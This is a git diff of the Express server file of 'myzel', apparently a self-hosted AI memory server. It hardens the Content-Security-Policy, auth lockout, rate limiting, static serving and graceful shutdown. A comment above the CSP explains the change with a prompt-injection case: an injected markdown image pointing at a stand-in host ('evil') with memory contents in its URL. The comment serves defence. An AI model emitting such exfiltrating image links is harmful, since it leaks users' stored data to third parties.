@@ -10,8 +10,9 @@ import { chatRouter } from "./api/chat.js";
 import { bearerAuth } from "./auth.js";
 import { corsDelegate, isLoopbackHost, netGuard, parseList } from "./net-guard.js";
 import { parseTrustProxy, rateLimit } from "./rate-limit.js";
+import { envCount } from "./env.js";
 import { LIMITS } from "./limits.js";
-import { checkModelConfig } from "./startup.js";
+import { checkGitAutocommit, checkModelConfig } from "./startup.js";
 import { startDreamer } from "./dreamer.js";
 
 const bundleRoot = process.env.BUNDLE_ROOT;
@@ -23,6 +24,13 @@ if (!bundleRoot) {
 const kb = new KnowledgeBase(bundleRoot, {
   gitAutocommit: process.env.GIT_AUTOCOMMIT === "true",
 });
+await checkGitAutocommit(kb, (line) => console.log(line));
+
+/** Failed authentication attempts per client before it is locked out for the window. */
+const AUTH_FAILURE_LIMIT = 20;
+const AUTH_FAILURE_WINDOW_MS = 15 * 60_000;
+/** Below Docker's 10s grace period between SIGTERM and SIGKILL. */
+const SHUTDOWN_DEADLINE_MS = 8_000;
 
 const stopDreamer = startDreamer(kb);
 
@@ -47,11 +55,14 @@ if (trustProxy !== undefined) {
 // Baseline headers for the UI and API. Shiki's highlighted code carries inline
 // `style` attributes, hence 'unsafe-inline' for styles only; scripts stay
 // same-origin. frame-ancestors keeps the UI out of other sites' iframes.
+// Images only from here: model output is rendered as markdown, and an
+// injected ![](https://evil/?data=…) would otherwise send memory contents to a
+// third party the moment it renders, without a click.
 app.use((_req, res, next) => {
   res.setHeader(
     "Content-Security-Policy",
     "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
-      "img-src 'self' data: https:; connect-src 'self'; object-src 'none'; " +
+      "img-src 'self' data:; connect-src 'self'; object-src 'none'; " +
       "base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
   );
   res.setHeader("X-Content-Type-Options", "nosniff");
@@ -89,32 +100,25 @@ app.use(express.json({ limit: LIMITS.jsonBody }));
 // before auth so a hostile origin is refused whether or not a token is set.
 app.use(["/mcp", "/api"], netGuard(guardConfig));
 
-// Optional bearer auth (issue #1): protects the memory (/mcp + /api) when
-// AUTH_TOKEN is set. Static web UI stays open and prompts for the token.
+// Optional bearer auth: protects the memory (/mcp + /api) when AUTH_TOKEN is
+// set. The static web UI stays open and prompts for the token.
 if (authToken) {
-  // Failed attempts are braked before the token is even compared, so the
-  // token cannot be guessed at line rate. Successful requests don't count.
+  // bearerAuth refuses a client after AUTH_FAILURE_LIMIT failed attempts per
+  // window, before the token is even compared.
   app.use(
     ["/mcp", "/api"],
-    rateLimit({
-      limit: 20,
-      windowMs: 15 * 60_000,
-      countIf: (res) => res.statusCode === 401,
-      hint: "Too many failed authentication attempts.",
-    })
+    bearerAuth(authToken, { limit: AUTH_FAILURE_LIMIT, windowMs: AUTH_FAILURE_WINDOW_MS })
   );
-  app.use(["/mcp", "/api"], bearerAuth(authToken));
   console.log("[myzel] auth: bearer token required for /mcp and /api");
 } else {
   console.log("[myzel] auth: disabled (set AUTH_TOKEN to protect /mcp and /api)");
 }
 
 // Both routers below can start an agent run, which costs tokens — brake them.
-// A malformed RATE_LIMIT must not silently disable the brake — only an
-// explicit 0 does that.
-const rateLimitRaw = Number(process.env.RATE_LIMIT);
+// A blank or malformed RATE_LIMIT must not silently disable the brake — only
+// an explicit 0 does that (envCount).
 const rateLimitOptions = {
-  limit: Number.isFinite(rateLimitRaw) && rateLimitRaw >= 0 ? rateLimitRaw : 60,
+  limit: envCount(process.env.RATE_LIMIT, 60),
   windowMs: parseDuration(process.env.RATE_LIMIT_WINDOW) ?? 60_000,
 };
 if (rateLimitOptions.limit > 0) {
@@ -130,17 +134,17 @@ if (rateLimitOptions.limit > 0) {
 }
 
 // The browse API never calls a model, but each request reads the whole bundle;
-// a looser brake keeps a scripted client from pinning the disk.
-const browseLimitRaw = Number(process.env.RATE_LIMIT_BROWSE);
-const browseLimit = Number.isFinite(browseLimitRaw) && browseLimitRaw >= 0 ? browseLimitRaw : 600;
+// a looser brake keeps a scripted client from pinning the disk. /api/chat has
+// its own (stricter) limit above and is not counted twice.
+const browseLimit = envCount(process.env.RATE_LIMIT_BROWSE, 600);
 if (browseLimit > 0) {
-  app.use(
-    "/api",
-    rateLimit({
-      limit: browseLimit,
-      windowMs: rateLimitOptions.windowMs,
-      hint: "Raise RATE_LIMIT_BROWSE, or set it to 0 to disable.",
-    })
+  const browseLimiter = rateLimit({
+    limit: browseLimit,
+    windowMs: rateLimitOptions.windowMs,
+    hint: "Raise RATE_LIMIT_BROWSE, or set it to 0 to disable.",
+  });
+  app.use("/api", (req, res, next) =>
+    req.path === "/chat" ? next() : browseLimiter(req, res, next)
   );
 }
 
@@ -148,13 +152,14 @@ app.use("/mcp", mcpRouter(kb));
 app.use("/api", browseRouter(kb));
 app.use("/api", chatRouter(kb));
 
-// Serve the built web UI in production (single container), with SPA fallback.
+// Serve the built web UI in production (single container).
 const webDist = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../web/dist");
 if (existsSync(webDist)) {
+  // index.html at "/" and the built assets — nothing else. The UI has no
+  // client-side routes, and its asset URLs are relative (to work under a proxy
+  // path prefix), so serving index.html at other paths would only produce a
+  // blank page whose assets resolve under that path. Unknown paths are 404s.
   app.use(express.static(webDist));
-  app.get(/^(?!\/(api|mcp)).*/, (_req, res) => {
-    res.sendFile(path.join(webDist, "index.html"));
-  });
 }
 
 // Last resort: log the error, but never send a stack trace (absolute paths,
@@ -170,7 +175,7 @@ app.use(
   }
 );
 
-const port = Number(process.env.PORT ?? 3800);
+const port = envCount(process.env.PORT, 3800);
 const server = app.listen(port, host, () => {
   console.log(
     `[myzel] origin guard: same-origin` +
@@ -191,8 +196,11 @@ const server = app.listen(port, host, () => {
 
 /**
  * Graceful shutdown: `docker stop` sends SIGTERM, then SIGKILL after 10s. Stop
- * accepting requests and let the mutation queue drain, so a concept is never
- * left written without its index.md, log.md entry or commit.
+ * accepting requests, let running requests finish (an agent run may still be
+ * writing), then let the mutation queue drain, so a concept is never left
+ * written without its index.md, log.md entry or commit. A run that outlasts the
+ * deadline is cut off: every file it wrote is complete (writes are atomic),
+ * but its last mutation may lack the index, log entry or commit that follows.
  */
 let shuttingDown = false;
 const shutdown = (signal: string) => {
@@ -200,17 +208,19 @@ const shutdown = (signal: string) => {
   shuttingDown = true;
   console.log(`[myzel] ${signal}: finishing pending writes, then exiting`);
   stopDreamer();
-  server.close();
+  const requestsDone = new Promise<void>((resolve) => server.close(() => resolve()));
   server.closeIdleConnections();
   const deadline = setTimeout(() => {
-    console.error("[myzel] shutdown timed out with writes pending — exiting anyway");
+    console.error("[myzel] shutdown timed out with requests or writes pending — exiting anyway");
     process.exit(1);
-  }, 8_000);
+  }, SHUTDOWN_DEADLINE_MS);
   deadline.unref();
-  kb.idle().then(
-    () => process.exit(0),
-    () => process.exit(1)
-  );
+  requestsDone
+    .then(() => kb.idle())
+    .then(
+      () => process.exit(0),
+      () => process.exit(1)
+    );
 };
 process.on("SIGTERM", () => shutdown("SIGTERM"));
 process.on("SIGINT", () => shutdown("SIGINT"));
